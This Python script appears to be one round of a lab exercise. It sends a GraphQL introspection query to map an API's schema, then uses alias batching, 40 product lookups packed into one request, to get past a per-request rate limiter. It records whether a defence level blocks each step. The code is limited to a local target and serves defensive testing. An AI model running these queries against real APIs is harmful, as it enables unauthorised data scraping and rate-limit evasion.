"""Round 2 attack — GraphQL introspection scan + alias batching.

Step 1: a single introspection query returns the entire schema — every type,
field and argument — the GraphQL equivalent of downloading the API spec.

Step 2: alias batching. One operation aliases the same ``product`` field many
times ( ``a0: product(id:1) a1: product(id:2) …`` ), so one HTTP request drives
dozens of resolver calls. A per-request rate limiter counts this as one request;
the backend does all the work.

At DEFENSE_LEVEL<2 both succeed. At DEFENSE_LEVEL=2 introspection is rejected and
the alias count exceeds the cap, so the batch is refused before it runs.
"""

from __future__ import annotations

import httpx

from _common import BASE_URL, headers, require_local_target

ACTOR = "bot-r2"

INTROSPECTION = "{ __schema { types { name kind fields { name } } } }"


def alias_batch(n: int) -> str:
    aliases = " ".join(f"a{i}: product(id: {i + 1}) {{ id sku price inventory }}" for i in range(n))
    return "query Batch { " + aliases + " }"


def run(base: str = BASE_URL, n: int = 40) -> dict:
    require_local_target(base)
    h = headers(ACTOR)
    with httpx.Client(base_url=base, headers=h, timeout=15) as c:
        r = c.post("/graphql", json={"query": INTROSPECTION})
        intro = r.json()
        types = intro.get("data", {}).get("__schema", {}).get("types") if intro.get("data") else None
        intro_blocked = types is None
        type_count = 0 if intro_blocked else len([t for t in types if not t["name"].startswith("__")])

        r = c.post("/graphql", json={"query": alias_batch(n), "operationName": "Batch"})
        body = r.json()
        batch_blocked = r.status_code != 200 or "errors" in body and "data" not in body
        got = len(body["data"]) if body.get("data") else 0
        cost = body.get("extensions", {}).get("cost", 0)
    return {"actor": ACTOR, "introspection_blocked": intro_blocked, "types_mapped": type_count,
            "alias_batch_blocked": batch_blocked, "products_via_aliases": got,
            "resolver_cost": cost}


if __name__ == "__main__":
    s = run()
    print(f"[round2] introspection {'BLOCKED' if s['introspection_blocked'] else 'mapped ' + str(s['types_mapped']) + ' types'}; "
          f"alias batch {'BLOCKED' if s['alias_batch_blocked'] else 'pulled ' + str(s['products_via_aliases']) + ' products, cost ' + str(s['resolver_cost'])}")
